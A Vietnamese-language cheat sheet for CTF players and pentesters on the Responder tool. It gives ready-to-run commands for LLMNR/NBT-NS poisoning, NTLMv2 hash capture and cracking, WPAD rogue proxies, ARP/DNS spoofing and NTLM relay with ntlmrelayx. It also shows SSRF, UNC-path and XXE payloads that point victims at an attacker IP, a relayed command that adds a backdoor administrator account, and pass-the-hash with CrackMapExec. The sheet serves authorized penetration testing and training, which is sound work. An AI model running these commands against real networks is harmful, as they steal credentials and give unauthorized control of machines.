# 🎯 Responder Cheat Sheet

> Dành cho CTF players & pentesters — LLMNR/NBT-NS/mDNS Poisoning & Credential Capture ⚠️ Chỉ sử dụng trên hệ thống bạn được phép kiểm tra (CTF labs, HackTheBox, TryHackMe, authorized pentest)

---

## 📦 Cài đặt

```bash
# Kali / Parrot (thường có sẵn)
which responder

# Cài từ apt
sudo apt install responder

# Clone từ GitHub (version mới nhất)
git clone https://github.com/lgandx/Responder
cd Responder

# Chạy trực tiếp
sudo python3 Responder.py -h

# Kiểm tra version
responder --version
```

---

## 🧠 Responder hoạt động như thế nào?

```
Client muốn tìm "\\fileserver" nhưng DNS không resolve được
    ↓
Client broadcast LLMNR / NBT-NS query: "Ai biết fileserver không?"
    ↓
Responder trả lời: "Tôi biết! IP của tôi là 10.10.14.5"
    ↓
Client kết nối đến attacker, gửi NTLMv2 hash để authenticate
    ↓
Responder capture hash → crack offline với Hashcat/John
```

**Các protocol Responder poison:**

- **LLMNR** (Link-Local Multicast Name Resolution) — UDP 5355
- **NBT-NS** (NetBIOS Name Service) — UDP 137
- **mDNS** (Multicast DNS) — UDP 5353
- **MDNS** — UDP 5353

---

## 🚀 Khởi động cơ bản

```bash
# Bắt đầu lắng nghe (interface eth0)
sudo responder -I eth0

# Verbose mode — xem chi tiết
sudo responder -I eth0 -v

# Wpad + ForceWpad (force proxy auth)
sudo responder -I eth0 -w -F

# Chạy trên HTB/THM (tun0)
sudo responder -I tun0

# Tắt một số servers không cần (giảm noise)
sudo responder -I eth0 --disable-ess
```

---

## 🔧 Options quan trọng

|Option|Mô tả|
|---|---|
|`-I <iface>`|Interface (bắt buộc)|
|`-A`|Analyze mode — passive, không poison, chỉ quan sát|
|`-v`|Verbose|
|`-b`|Basic HTTP auth (thay vì NTLM)|
|`-r`|Enable answers for netbios wredir suffix queries|
|`-d`|Enable answers for domain suffix queries|
|`-w`|Bật WPAD rogue proxy server|
|`-F`|Force NTLM/Basic auth trên WPAD|
|`-P`|Force NTLM (Clear Text) auth trên proxy|
|`--lm`|Force LM hashing (downgrade từ NTLMv2)|
|`--disable-ess`|Disable ESS (Extended Session Security)|
|`-f`|Fingerprint hosts|
|`--wpad-ip`|Custom IP cho WPAD|
|`--wpad-auth-num`|Số lần auth trước khi serve PAC|
|`-t`|Custom challenge (hex)|
|`--caching`|Enable NBT-NS và LLMNR caching|

---

## 📋 File cấu hình — `Responder.conf`

```ini
# /etc/responder/Responder.conf
# hoặc Responder/Responder.conf (nếu clone từ git)

[Responder Core]

; Servers to start
SQL = On
SMB = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
RDP = On
DCE-RPC = On
WinRM = On

; Custom challenge — thay vì random (dùng để crack với rainbow table)
Challenge = Random
; Challenge = 1122334455667788

; Tắt server nếu bị conflict với service thật
; SMB = Off   (nếu máy đang chạy Samba)
; HTTP = Off  (nếu máy đang chạy web server)
```

---

## 🗂️ Output & Log files

```bash
# Logs mặc định (khi cài qua apt)
/usr/share/responder/logs/

# Logs khi clone từ git
./Responder/logs/

# Các file quan trọng
ls /usr/share/responder/logs/
# SMB-NTLMv2-SSP-10.10.10.100.txt   ← NTLMv2 hashes bắt được
# HTTP-NTLMv2-10.10.10.100.txt
# Poisoners-Session.log              ← session log
# Analyzer-Session.log               ← analyze mode log
# Config-Responder.log
```

---

## 🔐 Crack hashes sau khi bắt được

### NTLMv2 với Hashcat (cách IppSec hay làm)

```bash
# Xem hash bắt được
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt

# Crack với hashcat (-m 5600 = NTLMv2)
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

# Với rules (tăng hiệu quả)
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Brute force nếu wordlist không work
hashcat -m 5600 hashes.txt -a 3 ?u?l?l?l?l?d?d

# Với GPU (nhanh hơn nhiều)
hashcat -m 5600 hashes.txt rockyou.txt --force
```

### NTLMv1 với Hashcat

```bash
# NTLMv1 (-m 5500)
hashcat -m 5500 hashes.txt rockyou.txt

# NTLMv1 không có ESS (-m 5500)
# Dùng --lm flag khi chạy Responder để downgrade
sudo responder -I eth0 --lm --disable-ess
hashcat -m 5500 hashes.txt rockyou.txt
```

### John the Ripper

```bash
john --format=netntlmv2 hashes.txt --wordlist=rockyou.txt
john --format=netntlmv2 hashes.txt --show
```

---

## 🕵️ Analyze Mode (Passive — không poison)

```bash
# Quan sát mạng, không gửi response
sudo responder -I eth0 -A

# Xem ai đang query gì
# Hữu ích để: recon trước khi attack, tránh bị phát hiện
```

---

## 🎭 WPAD Attack (Web Proxy Auto-Discovery)

```bash
# Force clients dùng proxy của mình
sudo responder -I eth0 -w -F

# Clear text credentials qua proxy
sudo responder -I eth0 -w -F -P

# Kết hợp với -b (Basic auth thay vì NTLM)
sudo responder -I eth0 -w -b
```

---

## 🔗 Kết hợp với MITM tools

### Responder + Bettercap (MITM + Poison)

```bash
# Terminal 1: Bettercap MITM
sudo bettercap -iface eth0 -eval "
  set arp.spoof.fullduplex true;
  set arp.spoof.targets 192.168.1.0/24;
  set dns.spoof.all true;
  set dns.spoof.address 192.168.1.50;
  arp.spoof on;
  dns.spoof on
"

# Terminal 2: Responder bắt auth
sudo responder -I eth0 -v
```

### Responder + Ettercap (DNS Spoof → Responder)

```bash
# Ettercap DNS spoof toàn bộ → Responder IP
# Trong /etc/ettercap/etter.dns:
# * A 10.10.14.5

# Terminal 1: Ettercap
sudo ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /victim/ /gateway/

# Terminal 2: Responder
sudo responder -I eth0 -v
```

---

## 🏁 CTF Scenarios thực tế

### Scenario 1: HTB/THM Windows box — NTLMv2 capture

```bash
# Step 1: Bật Responder trên tun0
sudo responder -I tun0 -v

# Step 2: Trigger authentication từ target
# Thường gặp: scan SMB, UNC path, file inclusion, SSRF
# Ví dụ: khai thác SSRF để victim connect về
# http://target.com/fetch?url=\\10.10.14.5\share

# Step 3: Responder bắt được hash
# [SMB] NTLMv2-SSP Client   : 10.10.10.100
# [SMB] NTLMv2-SSP Username : DOMAIN\user
# [SMB] NTLMv2-SSP Hash     : user::DOMAIN:...

# Step 4: Crack hash
hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt
```

### Scenario 2: SSRF → NTLM capture (web challenge)

```bash
# Khi có SSRF vulnerability, force server kết nối về Responder
# Target: http://10.10.10.100/fetch?url=http://attacker/
# Hoặc UNC: file=\\10.10.14.5\test

# Responder lắng nghe
sudo responder -I tun0 -v

# Trigger bằng curl
curl "http://10.10.10.100/api/fetch?url=http://10.10.14.5/"
curl "http://10.10.10.100/report?path=\\\\10.10.14.5\\share"
```

### Scenario 3: File upload → XXE → NTLM

```bash
# Upload file XML/DOCX chứa external entity trỏ về Responder
# xxe.docx → [Content_Types].xml với:
# <!ENTITY % remote SYSTEM "\\10.10.14.5\share\evil.dtd">

sudo responder -I tun0 -v
# Upload file → server parse → NTLM hash gửi về
```

### Scenario 4: Active Directory — Internal pentest

```bash
# Chạy Responder trên mạng nội bộ
sudo responder -I eth0 -w -d -v

# Đợi user browse \\fileserver (typo hoặc không tồn tại)
# → LLMNR broadcast
# → Responder trả lời
# → NTLMv2 hash bắt được

# Nếu có local admin hash — Pass the Hash
crackmapexec smb 192.168.1.0/24 -u admin -H <NTLM_HASH>
```

### Scenario 5: MultiRelay — từ hash đến shell

```bash
# Khi SMB signing disabled, có thể relay thay vì crack
# Kiểm tra SMB signing
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
nmap --script smb2-security-mode -p445 192.168.1.0/24

# Tắt SMB và HTTP trong Responder.conf để relay
# SMB = Off
# HTTP = Off

# Terminal 1: Responder
sudo responder -I eth0 -v

# Terminal 2: ntlmrelayx (impacket)
sudo ntlmrelayx.py -tf relay_targets.txt -smb2support
# Hoặc interactive shell
sudo ntlmrelayx.py -tf relay_targets.txt -smb2support -i
```

---

## 🔄 NTLM Relay với Impacket

```bash
# Kiểm tra SMB signing (nếu off → có thể relay)
nmap --script smb2-security-mode.nse -p 445 10.10.10.0/24

# Tắt SMB + HTTP trong Responder.conf trước
# SMB = Off
# HTTP = Off

# Basic relay
sudo ntlmrelayx.py -t smb://10.10.10.100 -smb2support

# Dump SAM database
sudo ntlmrelayx.py -t smb://10.10.10.100 -smb2support --no-http-server

# Execute command
sudo ntlmrelayx.py -t smb://10.10.10.100 -smb2support \
  -c "net user hacker Password123! /add && net localgroup administrators hacker /add"

# Relay to LDAP (thêm computer account, DCSync rights)
sudo ntlmrelayx.py -t ldap://dc.domain.local --delegate-access

# Relay đến nhiều targets
sudo ntlmrelayx.py -tf targets.txt -smb2support
```

---

## 📊 Đọc và xử lý logs

```bash
# Xem tất cả hashes đã bắt
cat /usr/share/responder/logs/*.txt | grep "NTLMv2"

# Deduplicate hashes (cùng user bắt nhiều lần)
sort -u /usr/share/responder/logs/SMB-NTLMv2-*.txt > unique_hashes.txt

# Extract chỉ hash lines
grep "::" /usr/share/responder/logs/*.txt > all_hashes.txt

# Thống kê users đã bắt
grep "Username" /usr/share/responder/logs/Poisoners-Session.log | sort -u
```

---

## ⚙️ MultiRelay (built-in Responder tool)

```bash
# Responder có sẵn MultiRelay.py
cd /usr/share/responder/tools/
# hoặc
cd Responder/tools/

# Relay về target
sudo python3 MultiRelay.py -t 10.10.10.100 -u ALL

# Relay specific users
sudo python3 MultiRelay.py -t 10.10.10.100 -u admin,administrator

# Xem help
sudo python3 MultiRelay.py -h
```

---

## 🛠️ Responder + Crackmapexec workflow

```bash
# Step 1: Scan để tìm targets
crackmapexec smb 192.168.1.0/24

# Step 2: Tìm hosts không có SMB signing
crackmapexec smb 192.168.1.0/24 --gen-relay-list unsigned.txt

# Step 3: Responder bắt hashes
sudo responder -I eth0 -v

# Step 4: Crack hoặc relay
# Crack:
hashcat -m 5600 hashes.txt rockyou.txt

# Relay:
sudo ntlmrelayx.py -tf unsigned.txt -smb2support

# Step 5: Dùng credentials
crackmapexec smb 192.168.1.0/24 -u admin -p 'Password123'
crackmapexec smb 192.168.1.0/24 -u admin -H 'aad3b435b51404eeaad3b435b51404ee:HASH'
```

---

## ⚠️ Troubleshooting

```bash
# Port đã bị chiếm (80, 443, 445...)
# Tắt service conflict
sudo systemctl stop smbd
sudo systemctl stop apache2

# Hoặc tắt server trong Responder.conf
# HTTP = Off
# SMB = Off

# Không bắt được hash — kiểm tra firewall
sudo iptables -L | grep DROP

# Responder không start được
sudo lsof -i :445   # xem ai đang dùng port 445
sudo kill -9 <PID>

# Chạy lại sạch (xóa session cũ)
sudo rm /usr/share/responder/logs/*.txt

# Analyze mode để xem traffic không poison
sudo responder -I eth0 -A -v
```

---

## 🆚 So sánh Responder vs InveighZero

||Responder|InveighZero|
|---|---|---|
|Platform|Linux|Windows / PowerShell|
|LLMNR poison|✅|✅|
|NBT-NS poison|✅|✅|
|NTLM relay|✅ (MultiRelay)|✅|
|CTF usage|✅ phổ biến nhất|ít hơn|
|IppSec dùng|✅|thỉnh thoảng|
|Active dev|✅|✅|

---

## 📚 Tài liệu tham khảo

- **GitHub**: [https://github.com/lgandx/Responder](https://github.com/lgandx/Responder)
- **Impacket ntlmrelayx**: [https://github.com/fortra/impacket](https://github.com/fortra/impacket)
- **CrackMapExec**: [https://github.com/byt3bl33d3r/CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
- **IppSec YouTube** — tìm kiếm "Responder HTB" để xem workflow thực tế
- **0xdf blog**: [https://0xdf.gitlab.io](https://0xdf.gitlab.io/)
- **HackTricks**: [https://book.hacktricks.xyz/windows-hardening/ntlm](https://book.hacktricks.xyz/windows-hardening/ntlm)

---

_Chỉ sử dụng trên mạng và hệ thống bạn được phép kiểm tra. LLMNR/NBT-NS poisoning trái phép là vi phạm pháp luật._